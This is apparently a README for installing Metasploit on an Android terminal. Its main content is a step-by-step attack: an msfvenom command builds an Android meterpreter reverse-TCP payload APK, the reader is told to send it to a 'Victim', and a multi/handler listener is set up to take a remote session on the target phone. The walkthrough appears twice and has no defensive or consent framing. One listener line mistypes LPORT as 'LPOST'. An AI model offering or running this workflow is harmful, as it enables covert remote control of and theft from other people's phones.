# MANUAL INSTALLATION
-------------------

# metasploit
-------------------------------------------------
<p> Install unstable Repo using this cmd :  <code>apt install unstable-repo </code> </p
<br>
<p> Update using this cmd :  <code>apt update</code> </p>
<br>
<p> Install Metasploit Framework using this cmd :  <code>apt install metasploit-framework </code> </p>
<br>

# After Installing Metasploit Framework
-------------------------------------------------

<p> Create a Android Payload using this cmd :  <br> <code>msfvenom -p android/meterpreter/reverse_tcp LHOST=ip addr LPORT=8001 -o /sdcard/Apk_Name.apk </code> </p>
<br>
  
# After Creating Payload For Android 
-----------------------------------------------------

<p> Send the Apk_Name.apk to your <b>Victim</b> (targeted_user) 
  
# Start a Metasploit Listener
-----------------------------------------------------
<p> open metasploit Console using this cmd :  <code>msfconsole </code> </p>

<h3>In msfconsole</h3> <br>

<ul> Type the following code : <br>
  <li> <code>use exploit/multi/handler</code> </li>
  <li> <code>set payload android/meterpreter/reverse_tcp</code> </li>
  <li> <code>set LHOST ip_addr</code> </li>
  <li> <code>set LPOST 8001</code> </li>
  <li> <code>run</code> </li>
 </ul>
 
 <p>Open the Application in target Phone</p>
 <p>then You will Get the Message Session Created...</p>
 <p> Then Type help cmd <code>help</code></p>
 <p> This will list the set of commands you can execute on target phone..... </p>
  
 # AUTOMATED INSTALL
 --------------------------
 
 <p> Update using this cmd : <code> apt update </code> </p>
 <p> Install Git Using this cmd : <code> apt install git </code> </p>
 <p> change directory to metasploit folder using this cmd : <code> cd metasploit</code> </p>
 <p> Type this cmd : <code> chmod +x install.sh </code> </p>
 <p> Type the following cmd : <code> ./install.sh </code> </p>
 <p> Then wait for 4-5 mintues it will automatically install Metasploit Framework </p>
 
 # After Installation 
 -------------------------
 
<p> Create a Android Payload using this cmd :  <br> <code>msfvenom -p android/meterpreter/reverse_tcp LHOST=ip addr LPORT=8001 -o /sdcard/Apk_Name.apk </code> </p>
<br>
  
# After Creating Payload For Android 
-----------------------------------------------------

<p> Send the Apk_Name.apk to your <b>Victim</b> (targeted_user) 
  
# Start a Metasploit Listener
-----------------------------------------------------
<p> open metasploit Console using this cmd :  <code>msfconsole </code> </p>

<h3>In msfconsole</h3> <br>

<ul> Type the following code : <br>
  <li> <code>use exploit/multi/handler</code> </li>
  <li> <code>set payload android/meterpreter/reverse_tcp</code> </li>
  <li> <code>set LHOST ip_addr</code> </li>
  <li> <code>set LPOST 8001</code> </li>
  <li> <code>run</code> </li>
 </ul>
 
 
 <p>Open the Application in target Phone</p>
 <p>then You will Get the Message Session Created...</p>
 <p> Then Type help cmd <code>help</code></p>
 <p> This will list the set of commands you can execute on target phone..... </p>
  
